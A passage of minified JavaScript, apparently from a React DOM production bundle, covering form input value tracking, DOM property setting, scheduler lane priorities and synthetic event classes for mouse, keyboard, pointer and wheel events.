                get: function () {
                    return s.call(this);
                },
                set: function (o) {
                    (r = "" + o), i.call(this, o);
                },
            }),
            Object.defineProperty(t, e, { enumerable: n.enumerable }),
            {
                getValue: function () {
                    return r;
                },
                setValue: function (o) {
                    r = "" + o;
                },
                stopTracking: function () {
                    (t._valueTracker = null), delete t[e];
                },
            }
        );
    }
}
function Ps(t) {
    t._valueTracker || (t._valueTracker = Kp(t));
}
function kd(t) {
    if (!t) return !1;
    var e = t._valueTracker;
    if (!e) return !0;
    var n = e.getValue(),
        r = "";
    return t && (r = bd(t) ? (t.checked ? "true" : "false") : t.value), (t = r), t !== n ? (e.setValue(t), !0) : !1;
}
function ci(t) {
    if (((t = t || (typeof document < "u" ? document : void 0)), typeof t > "u")) return null;
    try {
        return t.activeElement || t.body;
    } catch {
        return t.body;
    }
}
function ua(t, e) {
    var n = e.checked;
    return X({}, e, {
        defaultChecked: void 0,
        defaultValue: void 0,
        value: void 0,
        checked: n ?? t._wrapperState.initialChecked,
    });
}
function ju(t, e) {
    var n = e.defaultValue == null ? "" : e.defaultValue,
        r = e.checked != null ? e.checked : e.defaultChecked;
    (n = Xt(e.value != null ? e.value : n)),
        (t._wrapperState = {
            initialChecked: r,
            initialValue: n,
            controlled: e.type === "checkbox" || e.type === "radio" ? e.checked != null : e.value != null,
        });
}
function Sd(t, e) {
    (e = e.checked), e != null && vl(t, "checked", e, !1);
}
function ca(t, e) {
    Sd(t, e);
    var n = Xt(e.value),
        r = e.type;
    if (n != null)
        r === "number"
            ? ((n === 0 && t.value === "") || t.value != n) && (t.value = "" + n)
            : t.value !== "" + n && (t.value = "" + n);
    else if (r === "submit" || r === "reset") {
        t.removeAttribute("value");
        return;
    }
    e.hasOwnProperty("value")
        ? da(t, e.type, n)
        : e.hasOwnProperty("defaultValue") && da(t, e.type, Xt(e.defaultValue)),
        e.checked == null && e.defaultChecked != null && (t.defaultChecked = !!e.defaultChecked);
}
function Eu(t, e, n) {
    if (e.hasOwnProperty("value") || e.hasOwnProperty("defaultValue")) {
        var r = e.type;
        if (!((r !== "submit" && r !== "reset") || (e.value !== void 0 && e.value !== null))) return;
        (e = "" + t._wrapperState.initialValue), n || e === t.value || (t.value = e), (t.defaultValue = e);
    }
    (n = t.name),
        n !== "" && (t.name = ""),
        (t.defaultChecked = !!t._wrapperState.initialChecked),
        n !== "" && (t.name = n);
}
function da(t, e, n) {
    (e !== "number" || ci(t.ownerDocument) !== t) &&
        (n == null
            ? (t.defaultValue = "" + t._wrapperState.initialValue)
            : t.defaultValue !== "" + n && (t.defaultValue = "" + n));
}
var Or = Array.isArray;
function Xn(t, e, n, r) {
    if (((t = t.options), e)) {
        e = {};
        for (var s = 0; s < n.length; s++) e["$" + n[s]] = !0;
        for (n = 0; n < t.length; n++)
            (s = e.hasOwnProperty("$" + t[n].value)),
                t[n].selected !== s && (t[n].selected = s),
                s && r && (t[n].defaultSelected = !0);
    } else {
        for (n = "" + Xt(n), e = null, s = 0; s < t.length; s++) {
            if (t[s].value === n) {
                (t[s].selected = !0), r && (t[s].defaultSelected = !0);
                return;
            }
            e !== null || t[s].disabled || (e = t[s]);
        }
        e !== null && (e.selected = !0);
    }
}
function ha(t, e) {
    if (e.dangerouslySetInnerHTML != null) throw Error(S(91));
    return X({}, e, { value: void 0, defaultValue: void 0, children: "" + t._wrapperState.initialValue });
}
function Nu(t, e) {
    var n = e.value;
    if (n == null) {
        if (((n = e.children), (e = e.defaultValue), n != null)) {
            if (e != null) throw Error(S(92));
            if (Or(n)) {
                if (1 < n.length) throw Error(S(93));
                n = n[0];
            }
            e = n;
        }
        e == null && (e = ""), (n = e);
    }
    t._wrapperState = { initialValue: Xt(n) };
}
function jd(t, e) {
    var n = Xt(e.value),
        r = Xt(e.defaultValue);
    n != null &&
        ((n = "" + n),
        n !== t.value && (t.value = n),
        e.defaultValue == null && t.defaultValue !== n && (t.defaultValue = n)),
        r != null && (t.defaultValue = "" + r);
}
function Cu(t) {
    var e = t.textContent;
    e === t._wrapperState.initialValue && e !== "" && e !== null && (t.value = e);
}
function Ed(t) {
    switch (t) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml";
    }
}
function fa(t, e) {
    return t == null || t === "http://www.w3.org/1999/xhtml"
        ? Ed(e)
        : t === "http://www.w3.org/2000/svg" && e === "foreignObject"
          ? "http://www.w3.org/1999/xhtml"
          : t;
}
var Ts,
    Nd = (function (t) {
        return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction
            ? function (e, n, r, s) {
                  MSApp.execUnsafeLocalFunction(function () {
                      return t(e, n, r, s);
                  });
              }
            : t;
    })(function (t, e) {
        if (t.namespaceURI !== "http://www.w3.org/2000/svg" || "innerHTML" in t) t.innerHTML = e;
        else {
            for (
                Ts = Ts || document.createElement("div"),
                    Ts.innerHTML = "<svg>" + e.valueOf().toString() + "</svg>",
                    e = Ts.firstChild;
                t.firstChild;

            )
                t.removeChild(t.firstChild);
            for (; e.firstChild; ) t.appendChild(e.firstChild);
        }
    });
function Jr(t, e) {
    if (e) {
        var n = t.firstChild;
        if (n && n === t.lastChild && n.nodeType === 3) {
            n.nodeValue = e;
            return;
        }
    }
    t.textContent = e;
}
var Lr = {
        animationIterationCount: !0,
        aspectRatio: !0,
        borderImageOutset: !0,
        borderImageSlice: !0,
        borderImageWidth: !0,
        boxFlex: !0,
        boxFlexGroup: !0,
        boxOrdinalGroup: !0,
        columnCount: !0,
        columns: !0,
        flex: !0,
        flexGrow: !0,
        flexPositive: !0,
        flexShrink: !0,
        flexNegative: !0,
        flexOrder: !0,
        gridArea: !0,
        gridRow: !0,
        gridRowEnd: !0,
        gridRowSpan: !0,
        gridRowStart: !0,
        gridColumn: !0,
        gridColumnEnd: !0,
        gridColumnSpan: !0,
        gridColumnStart: !0,
        fontWeight: !0,
        lineClamp: !0,
        lineHeight: !0,
        opacity: !0,
        order: !0,
        orphans: !0,
        tabSize: !0,
        widows: !0,
        zIndex: !0,
        zoom: !0,
        fillOpacity: !0,
        floodOpacity: !0,
        stopOpacity: !0,
        strokeDasharray: !0,
        strokeDashoffset: !0,
        strokeMiterlimit: !0,
        strokeOpacity: !0,
        strokeWidth: !0,
    },
    Qp = ["Webkit", "ms", "Moz", "O"];
Object.keys(Lr).forEach(function (t) {
    Qp.forEach(function (e) {
        (e = e + t.charAt(0).toUpperCase() + t.substring(1)), (Lr[e] = Lr[t]);
    });
});
function Cd(t, e, n) {
    return e == null || typeof e == "boolean" || e === ""
        ? ""
        : n || typeof e != "number" || e === 0 || (Lr.hasOwnProperty(t) && Lr[t])
          ? ("" + e).trim()
          : e + "px";
}
function Pd(t, e) {
    t = t.style;
    for (var n in e)
        if (e.hasOwnProperty(n)) {
            var r = n.indexOf("--") === 0,
                s = Cd(n, e[n], r);
            n === "float" && (n = "cssFloat"), r ? t.setProperty(n, s) : (t[n] = s);
        }
}
var Jp = X(
    { menuitem: !0 },
    {
        area: !0,
        base: !0,
        br: !0,
        col: !0,
        embed: !0,
        hr: !0,
        img: !0,
        input: !0,
        keygen: !0,
        link: !0,
        meta: !0,
        param: !0,
        source: !0,
        track: !0,
        wbr: !0,
    }
);
function pa(t, e) {
    if (e) {
        if (Jp[t] && (e.children != null || e.dangerouslySetInnerHTML != null)) throw Error(S(137, t));
        if (e.dangerouslySetInnerHTML != null) {
            if (e.children != null) throw Error(S(60));
            if (typeof e.dangerouslySetInnerHTML != "object" || !("__html" in e.dangerouslySetInnerHTML))
                throw Error(S(61));
        }
        if (e.style != null && typeof e.style != "object") throw Error(S(62));
    }
}
function ma(t, e) {
    if (t.indexOf("-") === -1) return typeof e.is == "string";
    switch (t) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0;
    }
}
var ga = null;
function _l(t) {
    return (
        (t = t.target || t.srcElement || window),
        t.correspondingUseElement && (t = t.correspondingUseElement),
        t.nodeType === 3 ? t.parentNode : t
    );
}
var va = null,
    Yn = null,
    Zn = null;
function Pu(t) {
    if ((t = ys(t))) {
        if (typeof va != "function") throw Error(S(280));
        var e = t.stateNode;
        e && ((e = Wi(e)), va(t.stateNode, t.type, e));
    }
}
function Td(t) {
    Yn ? (Zn ? Zn.push(t) : (Zn = [t])) : (Yn = t);
}
function Rd() {
    if (Yn) {
        var t = Yn,
            e = Zn;
        if (((Zn = Yn = null), Pu(t), e)) for (t = 0; t < e.length; t++) Pu(e[t]);
    }
}
function Od(t, e) {
    return t(e);
}
function $d() {}
var _o = !1;
function Id(t, e, n) {
    if (_o) return t(e, n);
    _o = !0;
    try {
        return Od(t, e, n);
    } finally {
        (_o = !1), (Yn !== null || Zn !== null) && ($d(), Rd());
    }
}
function Xr(t, e) {
    var n = t.stateNode;
    if (n === null) return null;
    var r = Wi(n);
    if (r === null) return null;
    n = r[e];
    e: switch (e) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) ||
                ((t = t.type), (r = !(t === "button" || t === "input" || t === "select" || t === "textarea"))),
                (t = !r);
            break e;
        default:
            t = !1;
    }
    if (t) return null;
    if (n && typeof n != "function") throw Error(S(231, e, typeof n));
    return n;
}
var ya = !1;
if (bt)
    try {
        var br = {};
        Object.defineProperty(br, "passive", {
            get: function () {
                ya = !0;
            },
        }),
            window.addEventListener("test", br, br),
            window.removeEventListener("test", br, br);
    } catch {
        ya = !1;
    }
function Xp(t, e, n, r, s, i, o, a, l) {
    var c = Array.prototype.slice.call(arguments, 3);
    try {
        e.apply(n, c);
    } catch (d) {
        this.onError(d);
    }
}
var Mr = !1,
    di = null,
    hi = !1,
    xa = null,
    Yp = {
        onError: function (t) {
            (Mr = !0), (di = t);
        },
    };
function Zp(t, e, n, r, s, i, o, a, l) {
    (Mr = !1), (di = null), Xp.apply(Yp, arguments);
}
function em(t, e, n, r, s, i, o, a, l) {
    if ((Zp.apply(this, arguments), Mr)) {
        if (Mr) {
            var c = di;
            (Mr = !1), (di = null);
        } else throw Error(S(198));
        hi || ((hi = !0), (xa = c));
    }
}
function Nn(t) {
    var e = t,
        n = t;
    if (t.alternate) for (; e.return; ) e = e.return;
    else {
        t = e;
        do (e = t), e.flags & 4098 && (n = e.return), (t = e.return);
        while (t);
    }
    return e.tag === 3 ? n : null;
}
function Ad(t) {
    if (t.tag === 13) {
        var e = t.memoizedState;
        if ((e === null && ((t = t.alternate), t !== null && (e = t.memoizedState)), e !== null)) return e.dehydrated;
    }
    return null;
}
function Tu(t) {
    if (Nn(t) !== t) throw Error(S(188));
}
function tm(t) {
    var e = t.alternate;
    if (!e) {
        if (((e = Nn(t)), e === null)) throw Error(S(188));
        return e !== t ? null : t;
    }
    for (var n = t, r = e; ; ) {
        var s = n.return;
        if (s === null) break;
        var i = s.alternate;
        if (i === null) {
            if (((r = s.return), r !== null)) {
                n = r;
                continue;
            }
            break;
        }
        if (s.child === i.child) {
            for (i = s.child; i; ) {
                if (i === n) return Tu(s), t;
                if (i === r) return Tu(s), e;
                i = i.sibling;
            }
            throw Error(S(188));
        }
        if (n.return !== r.return) (n = s), (r = i);
        else {
            for (var o = !1, a = s.child; a; ) {
                if (a === n) {
                    (o = !0), (n = s), (r = i);
                    break;
                }
                if (a === r) {
                    (o = !0), (r = s), (n = i);
                    break;
                }
                a = a.sibling;
            }
            if (!o) {
                for (a = i.child; a; ) {
                    if (a === n) {
                        (o = !0), (n = i), (r = s);
                        break;
                    }
                    if (a === r) {
                        (o = !0), (r = i), (n = s);
                        break;
                    }
                    a = a.sibling;
                }
                if (!o) throw Error(S(189));
            }
        }
        if (n.alternate !== r) throw Error(S(190));
    }
    if (n.tag !== 3) throw Error(S(188));
    return n.stateNode.current === n ? t : e;
}
function Ld(t) {
    return (t = tm(t)), t !== null ? Md(t) : null;
}
function Md(t) {
    if (t.tag === 5 || t.tag === 6) return t;
    for (t = t.child; t !== null; ) {
        var e = Md(t);
        if (e !== null) return e;
        t = t.sibling;
    }
    return null;
}
var Ud = Me.unstable_scheduleCallback,
    Ru = Me.unstable_cancelCallback,
    nm = Me.unstable_shouldYield,
    rm = Me.unstable_requestPaint,
    ee = Me.unstable_now,
    sm = Me.unstable_getCurrentPriorityLevel,
    bl = Me.unstable_ImmediatePriority,
    Dd = Me.unstable_UserBlockingPriority,
    fi = Me.unstable_NormalPriority,
    im = Me.unstable_LowPriority,
    zd = Me.unstable_IdlePriority,
    zi = null,
    ht = null;
function om(t) {
    if (ht && typeof ht.onCommitFiberRoot == "function")
        try {
            ht.onCommitFiberRoot(zi, t, void 0, (t.current.flags & 128) === 128);
        } catch {}
}
var nt = Math.clz32 ? Math.clz32 : um,
    am = Math.log,
    lm = Math.LN2;
function um(t) {
    return (t >>>= 0), t === 0 ? 32 : (31 - ((am(t) / lm) | 0)) | 0;
}
var Rs = 64,
    Os = 4194304;
function $r(t) {
    switch (t & -t) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t & 4194240;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return t & 130023424;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return t;
    }
}
function pi(t, e) {
    var n = t.pendingLanes;
    if (n === 0) return 0;
    var r = 0,
        s = t.suspendedLanes,
        i = t.pingedLanes,
        o = n & 268435455;
    if (o !== 0) {
        var a = o & ~s;
        a !== 0 ? (r = $r(a)) : ((i &= o), i !== 0 && (r = $r(i)));
    } else (o = n & ~s), o !== 0 ? (r = $r(o)) : i !== 0 && (r = $r(i));
    if (r === 0) return 0;
    if (e !== 0 && e !== r && !(e & s) && ((s = r & -r), (i = e & -e), s >= i || (s === 16 && (i & 4194240) !== 0)))
        return e;
    if ((r & 4 && (r |= n & 16), (e = t.entangledLanes), e !== 0))
        for (t = t.entanglements, e &= r; 0 < e; ) (n = 31 - nt(e)), (s = 1 << n), (r |= t[n]), (e &= ~s);
    return r;
}
function cm(t, e) {
    switch (t) {
        case 1:
        case 2:
        case 4:
            return e + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return e + 5e3;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return -1;
        case 134217728:
        case 268435456:
        case 536870912:
        case 1073741824:
            return -1;
        default:
            return -1;
    }
}
function dm(t, e) {
    for (var n = t.suspendedLanes, r = t.pingedLanes, s = t.expirationTimes, i = t.pendingLanes; 0 < i; ) {
        var o = 31 - nt(i),
            a = 1 << o,
            l = s[o];
        l === -1 ? (!(a & n) || a & r) && (s[o] = cm(a, e)) : l <= e && (t.expiredLanes |= a), (i &= ~a);
    }
}
function wa(t) {
    return (t = t.pendingLanes & -1073741825), t !== 0 ? t : t & 1073741824 ? 1073741824 : 0;
}
function Fd() {
    var t = Rs;
    return (Rs <<= 1), !(Rs & 4194240) && (Rs = 64), t;
}
function bo(t) {
    for (var e = [], n = 0; 31 > n; n++) e.push(t);
    return e;
}
function gs(t, e, n) {
    (t.pendingLanes |= e),
        e !== 536870912 && ((t.suspendedLanes = 0), (t.pingedLanes = 0)),
        (t = t.eventTimes),
        (e = 31 - nt(e)),
        (t[e] = n);
}
function hm(t, e) {
    var n = t.pendingLanes & ~e;
    (t.pendingLanes = e),
        (t.suspendedLanes = 0),
        (t.pingedLanes = 0),
        (t.expiredLanes &= e),
        (t.mutableReadLanes &= e),
        (t.entangledLanes &= e),
        (e = t.entanglements);
    var r = t.eventTimes;
    for (t = t.expirationTimes; 0 < n; ) {
        var s = 31 - nt(n),
            i = 1 << s;
        (e[s] = 0), (r[s] = -1), (t[s] = -1), (n &= ~i);
    }
}
function kl(t, e) {
    var n = (t.entangledLanes |= e);
    for (t = t.entanglements; n; ) {
        var r = 31 - nt(n),
            s = 1 << r;
        (s & e) | (t[r] & e) && (t[r] |= e), (n &= ~s);
    }
}
var D = 0;
function Bd(t) {
    return (t &= -t), 1 < t ? (4 < t ? (t & 268435455 ? 16 : 536870912) : 4) : 1;
}
var Vd,
    Sl,
    Wd,
    Hd,
    qd,
    _a = !1,
    $s = [],
    Vt = null,
    Wt = null,
    Ht = null,
    Yr = new Map(),
    Zr = new Map(),
    Lt = [],
    fm =
        "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(
            " "
        );
function Ou(t, e) {
    switch (t) {
        case "focusin":
        case "focusout":
            Vt = null;
            break;
        case "dragenter":
        case "dragleave":
            Wt = null;
            break;
        case "mouseover":
        case "mouseout":
            Ht = null;
            break;
        case "pointerover":
        case "pointerout":
            Yr.delete(e.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            Zr.delete(e.pointerId);
    }
}
function kr(t, e, n, r, s, i) {
    return t === null || t.nativeEvent !== i
        ? ((t = { blockedOn: e, domEventName: n, eventSystemFlags: r, nativeEvent: i, targetContainers: [s] }),
          e !== null && ((e = ys(e)), e !== null && Sl(e)),
          t)
        : ((t.eventSystemFlags |= r), (e = t.targetContainers), s !== null && e.indexOf(s) === -1 && e.push(s), t);
}
function pm(t, e, n, r, s) {
    switch (e) {
        case "focusin":
            return (Vt = kr(Vt, t, e, n, r, s)), !0;
        case "dragenter":
            return (Wt = kr(Wt, t, e, n, r, s)), !0;
        case "mouseover":
            return (Ht = kr(Ht, t, e, n, r, s)), !0;
        case "pointerover":
            var i = s.pointerId;
            return Yr.set(i, kr(Yr.get(i) || null, t, e, n, r, s)), !0;
        case "gotpointercapture":
            return (i = s.pointerId), Zr.set(i, kr(Zr.get(i) || null, t, e, n, r, s)), !0;
    }
    return !1;
}
function Gd(t) {
    var e = mn(t.target);
    if (e !== null) {
        var n = Nn(e);
        if (n !== null) {
            if (((e = n.tag), e === 13)) {
                if (((e = Ad(n)), e !== null)) {
                    (t.blockedOn = e),
                        qd(t.priority, function () {
                            Wd(n);
                        });
                    return;
                }
            } else if (e === 3 && n.stateNode.current.memoizedState.isDehydrated) {
                t.blockedOn = n.tag === 3 ? n.stateNode.containerInfo : null;
                return;
            }
        }
    }
    t.blockedOn = null;
}
function Xs(t) {
    if (t.blockedOn !== null) return !1;
    for (var e = t.targetContainers; 0 < e.length; ) {
        var n = ba(t.domEventName, t.eventSystemFlags, e[0], t.nativeEvent);
        if (n === null) {
            n = t.nativeEvent;
            var r = new n.constructor(n.type, n);
            (ga = r), n.target.dispatchEvent(r), (ga = null);
        } else return (e = ys(n)), e !== null && Sl(e), (t.blockedOn = n), !1;
        e.shift();
    }
    return !0;
}
function $u(t, e, n) {
    Xs(t) && n.delete(e);
}
function mm() {
    (_a = !1),
        Vt !== null && Xs(Vt) && (Vt = null),
        Wt !== null && Xs(Wt) && (Wt = null),
        Ht !== null && Xs(Ht) && (Ht = null),
        Yr.forEach($u),
        Zr.forEach($u);
}
function Sr(t, e) {
    t.blockedOn === e &&
        ((t.blockedOn = null), _a || ((_a = !0), Me.unstable_scheduleCallback(Me.unstable_NormalPriority, mm)));
}
function es(t) {
    function e(s) {
        return Sr(s, t);
    }
    if (0 < $s.length) {
        Sr($s[0], t);
        for (var n = 1; n < $s.length; n++) {
            var r = $s[n];
            r.blockedOn === t && (r.blockedOn = null);
        }
    }
    for (
        Vt !== null && Sr(Vt, t),
            Wt !== null && Sr(Wt, t),
            Ht !== null && Sr(Ht, t),
            Yr.forEach(e),
            Zr.forEach(e),
            n = 0;
        n < Lt.length;
        n++
    )
        (r = Lt[n]), r.blockedOn === t && (r.blockedOn = null);
    for (; 0 < Lt.length && ((n = Lt[0]), n.blockedOn === null); ) Gd(n), n.blockedOn === null && Lt.shift();
}
var er = Et.ReactCurrentBatchConfig,
    mi = !0;
function gm(t, e, n, r) {
    var s = D,
        i = er.transition;
    er.transition = null;
    try {
        (D = 1), jl(t, e, n, r);
    } finally {
        (D = s), (er.transition = i);
    }
}
function vm(t, e, n, r) {
    var s = D,
        i = er.transition;
    er.transition = null;
    try {
        (D = 4), jl(t, e, n, r);
    } finally {
        (D = s), (er.transition = i);
    }
}
function jl(t, e, n, r) {
    if (mi) {
        var s = ba(t, e, n, r);
        if (s === null) Oo(t, e, r, gi, n), Ou(t, r);
        else if (pm(s, t, e, n, r)) r.stopPropagation();
        else if ((Ou(t, r), e & 4 && -1 < fm.indexOf(t))) {
            for (; s !== null; ) {
                var i = ys(s);
                if ((i !== null && Vd(i), (i = ba(t, e, n, r)), i === null && Oo(t, e, r, gi, n), i === s)) break;
                s = i;
            }
            s !== null && r.stopPropagation();
        } else Oo(t, e, r, null, n);
    }
}
var gi = null;
function ba(t, e, n, r) {
    if (((gi = null), (t = _l(r)), (t = mn(t)), t !== null))
        if (((e = Nn(t)), e === null)) t = null;
        else if (((n = e.tag), n === 13)) {
            if (((t = Ad(e)), t !== null)) return t;
            t = null;
        } else if (n === 3) {
            if (e.stateNode.current.memoizedState.isDehydrated) return e.tag === 3 ? e.stateNode.containerInfo : null;
            t = null;
        } else e !== t && (t = null);
    return (gi = t), null;
}
function Kd(t) {
    switch (t) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (sm()) {
                case bl:
                    return 1;
                case Dd:
                    return 4;
                case fi:
                case im:
                    return 16;
                case zd:
                    return 536870912;
                default:
                    return 16;
            }
        default:
            return 16;
    }
}
var zt = null,
    El = null,
    Ys = null;
function Qd() {
    if (Ys) return Ys;
    var t,
        e = El,
        n = e.length,
        r,
        s = "value" in zt ? zt.value : zt.textContent,
        i = s.length;
    for (t = 0; t < n && e[t] === s[t]; t++);
    var o = n - t;
    for (r = 1; r <= o && e[n - r] === s[i - r]; r++);
    return (Ys = s.slice(t, 1 < r ? 1 - r : void 0));
}
function Zs(t) {
    var e = t.keyCode;
    return (
        "charCode" in t ? ((t = t.charCode), t === 0 && e === 13 && (t = 13)) : (t = e),
        t === 10 && (t = 13),
        32 <= t || t === 13 ? t : 0
    );
}
function Is() {
    return !0;
}
function Iu() {
    return !1;
}
function De(t) {
    function e(n, r, s, i, o) {
        (this._reactName = n),
            (this._targetInst = s),
            (this.type = r),
            (this.nativeEvent = i),
            (this.target = o),
            (this.currentTarget = null);
        for (var a in t) t.hasOwnProperty(a) && ((n = t[a]), (this[a] = n ? n(i) : i[a]));
        return (
            (this.isDefaultPrevented = (i.defaultPrevented != null ? i.defaultPrevented : i.returnValue === !1)
                ? Is
                : Iu),
            (this.isPropagationStopped = Iu),
            this
        );
    }
    return (
        X(e.prototype, {
            preventDefault: function () {
                this.defaultPrevented = !0;
                var n = this.nativeEvent;
                n &&
                    (n.preventDefault ? n.preventDefault() : typeof n.returnValue != "unknown" && (n.returnValue = !1),
                    (this.isDefaultPrevented = Is));
            },
            stopPropagation: function () {
                var n = this.nativeEvent;
                n &&
                    (n.stopPropagation
                        ? n.stopPropagation()
                        : typeof n.cancelBubble != "unknown" && (n.cancelBubble = !0),
                    (this.isPropagationStopped = Is));
            },
            persist: function () {},
            isPersistent: Is,
        }),
        e
    );
}
var fr = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function (t) {
            return t.timeStamp || Date.now();
        },
        defaultPrevented: 0,
        isTrusted: 0,
    },
    Nl = De(fr),
    vs = X({}, fr, { view: 0, detail: 0 }),
    ym = De(vs),
    ko,
    So,
    jr,
    Fi = X({}, vs, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Cl,
        button: 0,
        buttons: 0,
        relatedTarget: function (t) {
            return t.relatedTarget === void 0
                ? t.fromElement === t.srcElement
                    ? t.toElement
                    : t.fromElement
                : t.relatedTarget;
        },
        movementX: function (t) {
            return "movementX" in t
                ? t.movementX
                : (t !== jr &&
                      (jr && t.type === "mousemove"
                          ? ((ko = t.screenX - jr.screenX), (So = t.screenY - jr.screenY))
                          : (So = ko = 0),
                      (jr = t)),
                  ko);
        },
        movementY: function (t) {
            return "movementY" in t ? t.movementY : So;
        },
    }),
    Au = De(Fi),
    xm = X({}, Fi, { dataTransfer: 0 }),
    wm = De(xm),
    _m = X({}, vs, { relatedTarget: 0 }),
    jo = De(_m),
    bm = X({}, fr, { animationName: 0, elapsedTime: 0, pseudoElement: 0 }),
    km = De(bm),
    Sm = X({}, fr, {
        clipboardData: function (t) {
            return "clipboardData" in t ? t.clipboardData : window.clipboardData;
        },
    }),
    jm = De(Sm),
    Em = X({}, fr, { data: 0 }),
    Lu = De(Em),
    Nm = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified",
    },
    Cm = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta",
    },
    Pm = { Alt: "altKey", Control: "ctrlKey", Meta: "metaKey", Shift: "shiftKey" };
function Tm(t) {
    var e = this.nativeEvent;
    return e.getModifierState ? e.getModifierState(t) : (t = Pm[t]) ? !!e[t] : !1;
}
function Cl() {
    return Tm;
}
var Rm = X({}, vs, {
        key: function (t) {
            if (t.key) {
                var e = Nm[t.key] || t.key;
                if (e !== "Unidentified") return e;
            }
            return t.type === "keypress"
                ? ((t = Zs(t)), t === 13 ? "Enter" : String.fromCharCode(t))
                : t.type === "keydown" || t.type === "keyup"
                  ? Cm[t.keyCode] || "Unidentified"
                  : "";
        },
        code: 0,
        location: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        repeat: 0,
        locale: 0,
        getModifierState: Cl,
        charCode: function (t) {
            return t.type === "keypress" ? Zs(t) : 0;
        },
        keyCode: function (t) {
            return t.type === "keydown" || t.type === "keyup" ? t.keyCode : 0;
        },
        which: function (t) {
            return t.type === "keypress" ? Zs(t) : t.type === "keydown" || t.type === "keyup" ? t.keyCode : 0;
        },
    }),
    Om = De(Rm),
    $m = X({}, Fi, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0,
    }),
    Mu = De($m),
    Im = X({}, vs, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Cl,
    }),
    Am = De(Im),
    Lm = X({}, fr, { propertyName: 0, elapsedTime: 0, pseudoElement: 0 }),
    Mm = De(Lm),
    Um = X({}, Fi, {
        deltaX: function (t) {
            return "deltaX" in t ? t.deltaX : "wheelDeltaX" in t ? -t.wheelDeltaX : 0;
        },
        deltaY: function (t) {
            return "deltaY" in t
                ? t.deltaY
                : "wheelDeltaY" in t
                  ? -t.wheelDeltaY
                  : "wheelDelta" in t
                    ? -t.wheelDelta
                    : 0;
        },
        deltaZ: 0,
        deltaMode: 0,
    }),
    Dm = De(Um),
